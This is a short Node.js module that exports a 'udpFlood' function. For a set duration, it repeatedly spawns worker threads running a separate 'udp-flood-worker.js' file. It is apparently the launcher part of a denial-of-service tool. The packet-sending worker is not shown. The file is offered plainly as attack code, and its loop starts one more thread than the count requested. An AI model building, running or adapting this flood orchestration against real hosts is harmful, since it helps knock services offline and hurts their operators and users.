const { Worker } = require('worker_threads');

function runService(workerData) {
  return new Promise((resolve, reject) => {
    const worker = new Worker('./workers/udp-flood-worker.js', { workerData });
    worker.on('message', resolve);
    worker.on('error', reject);
    worker.on('exit', (code) => {
      if (code !== 0) {
        reject(new Error(`Worker stopped with exit code ${code}`));
      }
    });
  });
}

async function threadLauncher(payload) {
  const { threads } = payload;
  const promises = [];
  for (let i = 0; i <= threads; i += 1) {
    promises.push(runService(payload));
  }
  const responses = await Promise.all(promises);
  console.log(responses);
}

function udpFlood(payload) {
  const { duration, timeout } = payload;
  const interval = setInterval(() => {
    threadLauncher(payload);
  }, timeout);
  setTimeout(() => {
    clearInterval(interval);
  }, duration);
}

module.exports = udpFlood;
